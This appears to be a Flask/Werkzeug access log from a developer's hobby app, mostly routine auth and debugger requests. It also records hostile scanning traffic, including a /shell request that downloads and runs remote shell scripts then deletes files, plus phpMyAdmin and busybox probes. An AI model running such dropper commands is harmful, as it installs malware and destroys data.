+INFO:werkzeug:43.229.74.192 - - [14/Dec/2019 20:41:50] "GET / HTTP/1.1" 200 -
+ERROR:werkzeug:94.102.52.28 - - [14/Dec/2019 22:49:15] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+INFO:werkzeug:94.102.52.28 - - [14/Dec/2019 22:49:15] "o kRHÅ#÷:Nßâ´/ÿ	T§Äy°hÆ¤="á ´,¯nãY»bhlÿ(=':©ÙoÈ¢×´ïå¹ (À" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:109.175.26.68 - - [14/Dec/2019 22:49:37] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:188.166.68.151 - - [14/Dec/2019 23:07:07] "GET /shell?wget%20http://173.249.13.175/Abyssbins.sh;%20chmod%20777%20Abyssbins.sh;%20sh%20Abyssbins.sh;%20tftp%20173.249.13.175%20-c%20get%20Abysstftp1.sh;%20chmod%20777%20Abysstftp1.sh;%20sh%20Abysstftp1.sh;%20tftp%20-r%20Abysstftp2.sh%20-g%20173.249.13.175;%20chmod%20777%20Abysstftp2.sh;%20sh%20Abysstftp2.sh;%20rm%20-rf%20Abyssbins.sh%20Abysstftp1.sh%20Abysstftp2.sh;%20rm%20-rf%20* HTTP/1.1" 404 -
+INFO:werkzeug:106.38.241.173 - - [14/Dec/2019 23:12:45] "GET /robots.txt HTTP/1.1" 404 -
+INFO:werkzeug:106.39.246.14 - - [14/Dec/2019 23:12:45] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:103.125.95.107 - - [14/Dec/2019 23:19:21] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:47.103.140.175 - - [15/Dec/2019 00:13:30] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:47.103.140.175 - - [15/Dec/2019 00:13:31] "GET /explicit_not_exist_path HTTP/1.1" 404 -
+INFO:werkzeug:47.103.140.175 - - [15/Dec/2019 00:13:31] "GET /index.html HTTP/1.1" 404 -
+INFO:werkzeug:47.103.140.175 - - [15/Dec/2019 00:13:31] "GET /index.php HTTP/1.1" 404 -
+INFO:werkzeug:47.103.140.175 - - [15/Dec/2019 00:13:31] "GET /index.jsp HTTP/1.1" 404 -
+INFO:werkzeug:47.103.140.175 - - [15/Dec/2019 00:13:31] "GET /admin/ HTTP/1.1" 404 -
+INFO:werkzeug:47.103.140.175 - - [15/Dec/2019 00:13:31] "GET /favicon.ico HTTP/1.1" 404 -
+INFO:werkzeug:47.103.140.175 - - [15/Dec/2019 00:13:32] "GET /robots.txt HTTP/1.1" 404 -
+INFO:werkzeug:47.103.140.175 - - [15/Dec/2019 00:13:32] "GET /wcm/ HTTP/1.1" 404 -
+INFO:werkzeug:47.103.140.175 - - [15/Dec/2019 00:13:32] "GET /phpMyAdmin/ HTTP/1.1" 404 -
+INFO:werkzeug:47.103.140.175 - - [15/Dec/2019 00:13:32] "GET /phpmyadmin/ HTTP/1.1" 404 -
+INFO:werkzeug:220.181.125.163 - - [15/Dec/2019 01:14:01] "GET /Product.aspx?pid=2871 HTTP/1.1" 404 -
+INFO:werkzeug:220.181.125.163 - - [15/Dec/2019 01:15:34] "GET /Product.aspx?pid=2453 HTTP/1.1" 404 -
+INFO:werkzeug:220.181.125.163 - - [15/Dec/2019 01:16:53] "GET /Products.aspx?category=34&page=10 HTTP/1.1" 404 -
+INFO:werkzeug:220.181.125.163 - - [15/Dec/2019 01:18:00] "GET /Products.aspx?price2=1&category=47&page=3 HTTP/1.1" 404 -
+INFO:werkzeug:111.7.100.23 - - [15/Dec/2019 02:47:17] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:167.99.130.208 - - [15/Dec/2019 04:20:54] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:58.152.99.9 - - [15/Dec/2019 04:44:32] "GET /shell?busybox HTTP/1.1" 404 -
+INFO:werkzeug:220.181.125.163 - - [15/Dec/2019 04:49:15] "GET /GameRules.aspx?KindID=25 HTTP/1.1" 404 -
+INFO:werkzeug:80.82.70.187 - - [15/Dec/2019 06:16:12] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 -
+INFO:werkzeug:167.250.10.6 - - [15/Dec/2019 06:20:29] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:46.99.195.75 - - [15/Dec/2019 08:49:17] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:203.181.41.81 - - [15/Dec/2019 09:06:23] "POST /editBlackAndWhiteList HTTP/1.1" 404 -
+INFO:werkzeug:173.249.51.194 - - [15/Dec/2019 10:27:28] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:157.55.39.33 - - [15/Dec/2019 10:42:15] "GET /robots.txt HTTP/1.1" 404 -
+INFO:werkzeug:157.55.39.33 - - [15/Dec/2019 10:42:16] "GET /robots.txt HTTP/1.1" 404 -
+INFO:flask_wtf.csrf:The CSRF token has expired.
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:06:12] "POST /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:06:12] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/main/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:09:56] "GET /love HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:10:01] "GET /main/love?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:10:02] "GET /love HTTP/1.1" 200 -
+INFO:flask_wtf.csrf:The CSRF token has expired.
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:10:06] "POST /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:10:06] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:15:55] "GET /auth/register HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:16:04] "POST /auth/register HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:16:04] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:16:18] "GET /auth/register HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:16:37] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:16:39] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:16:45] "POST /auth/login HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:16:45] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:17:48] "GET /auth/register?nsukey=kr0NcehtPjyKjG9kdAVTvk7fV9noP%2B0r2rUJIQmzlO9wn7l463ntkBavX8c05ypPrNcpC5urTpcuEqyNLF2srbzhaC7BfAtqY6s5Vp3pgbU9QjUUelLDVGhPP7uDIu4WEJmz2B38YkGxeokHzLousuDTGLV2Xl%2FdBAG0kRBQq8kutIc%2BlOB4dlgHgFx%2FfDTNTuKMn7%2BBuA2o8Ep2MoGVdg%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:101.89.29.97 - - [16/Dec/2019 11:18:45] "GET /auth/register HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:18:46] "POST /auth/register?nsukey=kr0NcehtPjyKjG9kdAVTvk7fV9noP%2B0r2rUJIQmzlO9wn7l463ntkBavX8c05ypPrNcpC5urTpcuEqyNLF2srbzhaC7BfAtqY6s5Vp3pgbU9QjUUelLDVGhPP7uDIu4WEJmz2B38YkGxeokHzLousuDTGLV2Xl%2FdBAG0kRBQq8kutIc%2BlOB4dlgHgFx%2FfDTNTuKMn7%2BBuA2o8Ep2MoGVdg%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:61.151.178.175 - - [16/Dec/2019 11:18:48] "GET /auth/register?nsukey=kr0NcehtPjyKjG9kdAVTvk7fV9noP%2B0r2rUJIQmzlO9wn7l463ntkBavX8c05ypPrNcpC5urTpcuEqyNLF2srbzhaC7BfAtqY6s5Vp3pgbU9QjUUelLDVGhPP7uDIu4WEJmz2B38YkGxeokHzLousuDTGLV2Xl%2FdBAG0kRBQq8kutIc%2BlOB4dlgHgFx%2FfDTNTuKMn7%2BBuA2o8Ep2MoGVdg%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:19:30] "POST /auth/register?nsukey=kr0NcehtPjyKjG9kdAVTvk7fV9noP%2B0r2rUJIQmzlO9wn7l463ntkBavX8c05ypPrNcpC5urTpcuEqyNLF2srbzhaC7BfAtqY6s5Vp3pgbU9QjUUelLDVGhPP7uDIu4WEJmz2B38YkGxeokHzLousuDTGLV2Xl%2FdBAG0kRBQq8kutIc%2BlOB4dlgHgFx%2FfDTNTuKMn7%2BBuA2o8Ep2MoGVdg%3D%3D HTTP/1.1" 302 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:19:30] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:19:33] "GET /auth/login?nsukey=uSSHfoenrn2JKYxiKIGHV%2F9%2Fgh%2FmxBLhBQdzmdVWzuTLMWmyfI3ipC%2F3S726GEJhG8HuKcioiUgjP3U1fQC0MEf6aOGnK9q5U865JUUNFTILZxg3OTW3Bcbetulh7BglbnT1jWYkkQqg0Qh8jX6TTZ4cxK5ZO8lz%2F%2B4HBXPBqRq%2B3A5Bne6mDW8uXuF4f4uRzJhOdsYqEDRyrJiEfYlYQw%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:19:45] "POST /auth/login?nsukey=uSSHfoenrn2JKYxiKIGHV%2F9%2Fgh%2FmxBLhBQdzmdVWzuTLMWmyfI3ipC%2F3S726GEJhG8HuKcioiUgjP3U1fQC0MEf6aOGnK9q5U865JUUNFTILZxg3OTW3Bcbetulh7BglbnT1jWYkkQqg0Qh8jX6TTZ4cxK5ZO8lz%2F%2B4HBXPBqRq%2B3A5Bne6mDW8uXuF4f4uRzJhOdsYqEDRyrJiEfYlYQw%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:20:00] "POST /auth/login?nsukey=uSSHfoenrn2JKYxiKIGHV%2F9%2Fgh%2FmxBLhBQdzmdVWzuTLMWmyfI3ipC%2F3S726GEJhG8HuKcioiUgjP3U1fQC0MEf6aOGnK9q5U865JUUNFTILZxg3OTW3Bcbetulh7BglbnT1jWYkkQqg0Qh8jX6TTZ4cxK5ZO8lz%2F%2B4HBXPBqRq%2B3A5Bne6mDW8uXuF4f4uRzJhOdsYqEDRyrJiEfYlYQw%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:20:06] "POST /auth/login?nsukey=uSSHfoenrn2JKYxiKIGHV%2F9%2Fgh%2FmxBLhBQdzmdVWzuTLMWmyfI3ipC%2F3S726GEJhG8HuKcioiUgjP3U1fQC0MEf6aOGnK9q5U865JUUNFTILZxg3OTW3Bcbetulh7BglbnT1jWYkkQqg0Qh8jX6TTZ4cxK5ZO8lz%2F%2B4HBXPBqRq%2B3A5Bne6mDW8uXuF4f4uRzJhOdsYqEDRyrJiEfYlYQw%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:58.247.206.141 - - [16/Dec/2019 11:20:30] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:20:34] "POST /auth/login?nsukey=uSSHfoenrn2JKYxiKIGHV%2F9%2Fgh%2FmxBLhBQdzmdVWzuTLMWmyfI3ipC%2F3S726GEJhG8HuKcioiUgjP3U1fQC0MEf6aOGnK9q5U865JUUNFTILZxg3OTW3Bcbetulh7BglbnT1jWYkkQqg0Qh8jX6TTZ4cxK5ZO8lz%2F%2B4HBXPBqRq%2B3A5Bne6mDW8uXuF4f4uRzJhOdsYqEDRyrJiEfYlYQw%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:22:11] "GET /auth/register?nsukey=WY0jZzGVH9%2FvcHyBs5LgR%2FVeTkDuwSWnvKLlW6qEOAKDCoDCoTEaemqKtS9V5Ks5FTnWLAFdXS0mzSLuOqcS1oz9sjW%2B7iV2iQrI0yGD%2Fb7yN5B06NtdtRNIkA1mzWe7B0B6exWtkViMmKXsrU4Agd6y0Kq39xwzOaWiZHpn9cJFnUDHamCE205mK0D080UjDWo3DMwEh1wbOwoTPVDZ4A%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:101.89.239.232 - - [16/Dec/2019 11:23:12] "GET /auth/register?nsukey=WY0jZzGVH9%2FvcHyBs5LgR%2FVeTkDuwSWnvKLlW6qEOAKDCoDCoTEaemqKtS9V5Ks5FTnWLAFdXS0mzSLuOqcS1oz9sjW%2B7iV2iQrI0yGD%2Fb7yN5B06NtdtRNIkA1mzWe7B0B6exWtkViMmKXsrU4Agd6y0Kq39xwzOaWiZHpn9cJFnUDHamCE205mK0D080UjDWo3DMwEh1wbOwoTPVDZ4A%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:24:07] "GET /auth/register?nsukey=QpROSh7UWDveRW5xbdVUzNyCMVM5dJARZDM%2Fm5M8SnIw0XOtMpB9HV6LFfSrv9PFsVpOZwm7ppOAP5rPZ98wpnQ%2FlW9aW%2FGTT3R2%2FNW9ji%2Fcsujvd%2BbmNB6KNQXk6p9LeZx28P3RuT3xx0S9idwMGg%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:24:50] "POST /auth/register?nsukey=QpROSh7UWDveRW5xbdVUzNyCMVM5dJARZDM%2Fm5M8SnIw0XOtMpB9HV6LFfSrv9PFsVpOZwm7ppOAP5rPZ98wpnQ%2FlW9aW%2FGTT3R2%2FNW9ji%2Fcsujvd%2BbmNB6KNQXk6p9LeZx28P3RuT3xx0S9idwMGg%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:101.91.60.104 - - [16/Dec/2019 11:25:07] "GET /auth/register?nsukey=QpROSh7UWDveRW5xbdVUzNyCMVM5dJARZDM%2Fm5M8SnIw0XOtMpB9HV6LFfSrv9PFsVpOZwm7ppOAP5rPZ98wpnQ%2FlW9aW%2FGTT3R2%2FNW9ji%2Fcsujvd%2BbmNB6KNQXk6p9LeZx28P3RuT3xx0S9idwMGg%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:25:28] "GET /auth/register?nsukey=F6FNyK%2BJVQrvbGhRM0wn0VlnrrK6p3SJY2GIouMuafyR9bgLjKePPCDoPZlA3Gu2OLWsxY00GF7DbGek6T0bZ58H7J97mqlXoCuPOfhCwtWsnWO5HtSV9QorGijmYl0CSDjHXXJh1pC1mZimne2RAZ0vDHjCXbTJbACPyAAa2dUjdaR288e%2Fw6gKIDey7nux8BW%2BVRpUpr1AvixZsEA08Q%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:25:30] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:80.82.70.187 - - [16/Dec/2019 11:25:31] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:25:32] "GET /?nsukey=rAxKcmFrGxNNb3AoYNlwDV205fBHMuU8qu3yztXUiCrL%2FhT7mRfhHsnvmC8cesCsAmXd9T6GAwhJgLKoAuSzN%2BuvbarFfXhyzk10p77fYhNxkbAyUecJazmdt6Z1X5WQ0hi8IO%2FfLEYsmxROq7JK8KPpzNkmbQbbx%2FomFR66U5hU8h5f7TOfHnB2S7UtyJlBZ%2FYf6RxdsJ3qlFbDQhnUaA%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:25:35] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:25:38] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:26:10] "POST /auth/login HTTP/1.1" 302 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:26:10] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:26:27] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:26:28] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:61.151.178.197 - - [16/Dec/2019 11:26:30] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:61.129.6.151 - - [16/Dec/2019 11:26:32] "GET /?nsukey=rAxKcmFrGxNNb3AoYNlwDV205fBHMuU8qu3yztXUiCrL%2FhT7mRfhHsnvmC8cesCsAmXd9T6GAwhJgLKoAuSzN%2BuvbarFfXhyzk10p77fYhNxkbAyUecJazmdt6Z1X5WQ0hi8IO%2FfLEYsmxROq7JK8KPpzNkmbQbbx%2FomFR66U5hU8h5f7TOfHnB2S7UtyJlBZ%2FYf6RxdsJ3qlFbDQhnUaA%3D%3D HTTP/1.1" 200 -
+INFO:werkzeug:104.248.164.231 - - [16/Dec/2019 11:28:07] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:28:51] "GET /auth/register HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:28:52] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:29:00] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:29:01] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:29:03] "GET /auth/register HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:29:04] "GET /auth/register HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:29:04] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:29:51] "POST /auth/register HTTP/1.1" 302 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:29:51] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:30:00] "POST /auth/login HTTP/1.1" 302 -
+INFO:werkzeug:119.137.53.7 - - [16/Dec/2019 11:30:00] "GET / HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:220.181.125.163 - - [16/Dec/2019 11:35:54] "GET /Products.aspx?price2=1&category=47&page=2 HTTP/1.1" 500 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:220.181.125.163 - - [16/Dec/2019 11:36:04] "GET /Pay/PayGame.aspx?type=2 HTTP/1.1" 500 -
+INFO:werkzeug:220.181.125.163 - - [16/Dec/2019 11:36:14] "GET /Product.aspx?pid=2469 HTTP/1.1" 500 -
+INFO:werkzeug:220.181.125.163 - - [16/Dec/2019 11:36:24] "GET /News/NewsView.aspx?XID=9 HTTP/1.1" 500 -
+INFO:werkzeug:220.181.125.163 - - [16/Dec/2019 11:36:34] "GET /Product.aspx?pid=3174 HTTP/1.1" 500 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:36:48] "GET /auth/unconfirmed HTTP/1.1" 500 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:36:49] "GET /auth/unconfirmed?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:36:49] "GET /auth/unconfirmed?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:36:49] "GET /auth/unconfirmed?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:36:49] "GET /auth/unconfirmed?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:36:49] "GET /auth/unconfirmed?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:36:49] "GET /auth/unconfirmed?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:41:01] "GET /auth/unconfirmed HTTP/1.1" 500 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:41:01] "GET /auth/unconfirmed?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:41:01] "GET /auth/unconfirmed?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:41:01] "GET /auth/unconfirmed?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:41:01] "GET /auth/unconfirmed?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:41:01] "GET /auth/unconfirmed?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:41:01] "GET /auth/unconfirmed?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:41:48] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:43:01] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:43:15] "GET /auth/confirm HTTP/1.1" 500 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:43:15] "GET /auth/confirm?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:43:15] "GET /auth/confirm?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:43:15] "GET /auth/confirm?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:43:15] "GET /auth/confirm?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:43:15] "GET /auth/confirm?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:43:31] "GET /auth/confirm?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:44:40] "GET /auth/confirm HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:44:40] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:44:40] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:44:54] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:44:54] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:44:55] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:12] "POST /auth/login HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:12] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:12] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:16] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:16] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:34] "GET /auth/change-password HTTP/1.1" 500 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:34] "GET /auth/change-password?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:34] "GET /auth/change-password?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:34] "GET /auth/change-password?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:34] "GET /auth/change-password?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:34] "GET /auth/change-password?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:34] "GET /auth/change-password?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 11:57:38] "GET /change-password HTTP/1.1" 404 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:02] "GET /auth/change-password HTTP/1.1" 500 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:02] "GET /auth/change-password?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:02] "GET /auth/change-password?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:02] "GET /auth/change-password?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:02] "GET /auth/change-password?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:02] "GET /auth/change-password?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:36] "GET /auth/change-password HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:36] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:41] "POST /auth/change-password HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:47] "POST /auth/change-password HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:47] "GET / HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:47] "GET /auth/unconfirmed HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:53] "GET /auth/logout HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:17:53] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:18:00] "GET /auth/change-password HTTP/1.1" 302 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 12:18:00] "GET /auth/login?next=%2Fauth%2Fchange-password HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug: * Detected change in '/root/flasky/app/models.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 14:16:44] "GET /auth/login?next=%2Fauth%2Fchange-password HTTP/1.1" 200 -
+INFO:werkzeug:183.17.228.129 - - [16/Dec/2019 14:16:45] "GET /static/favicon.ico HTTP/1.1" 200 -
